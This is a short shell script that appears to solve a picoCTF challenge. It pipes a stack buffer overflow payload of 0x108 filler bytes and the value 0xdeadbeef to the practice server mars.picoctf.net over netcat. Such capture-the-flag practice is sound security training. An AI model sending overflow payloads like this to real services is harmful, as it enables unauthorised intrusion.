#!/bin/sh
python -c "import sys; sys.stdout.buffer.write(0x108*b'A' + (0xdeadbeef).to_bytes(8, 'little') + b'\n')" | nc mars.picoctf.net 31890
